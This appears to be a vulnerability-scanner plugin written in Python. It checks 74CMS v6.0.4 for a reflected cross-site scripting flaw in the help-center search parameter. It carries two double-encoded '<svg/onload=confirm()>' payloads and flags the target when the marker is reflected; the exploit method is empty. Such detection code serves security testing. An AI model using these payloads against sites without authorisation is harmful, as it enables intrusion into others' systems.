#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
74CMS-v6.0.4版本 帮助中心搜索框处存在XSS
    暂无编号
        Payload: https://www.freebuf.com/vuls/284537.html
'''

from PluginManager import Vuln_Scan
from lib.tool.md5 import random_int_1

randomNum = random_int_1(6)

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'index.php?m=&c=help&a=help_list&key=1%253csvg/onload%253dconfirm%2528{TEXT}%2529%253E2&__hash__=1'},
            {'path': 'index.php?m=&c=help&a=help_list&key=137244gq1lw%253csvg/onload%253dconfirm%2528{TEXT}%2529%253Edutvxlqd4lq&__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': '74cms',
            'vul_type': 'XSS',
            'vul_id': '74cms-v6.0.4-xss',
        }
        
        for payload in self.payloads:
            path = payload['path'].format(TEXT=randomNum)

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            md = '<svg/onload=confirm(' + str(randomNum) + ')>'

            if (md in res.text):
                results = {
                    'Target': res.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
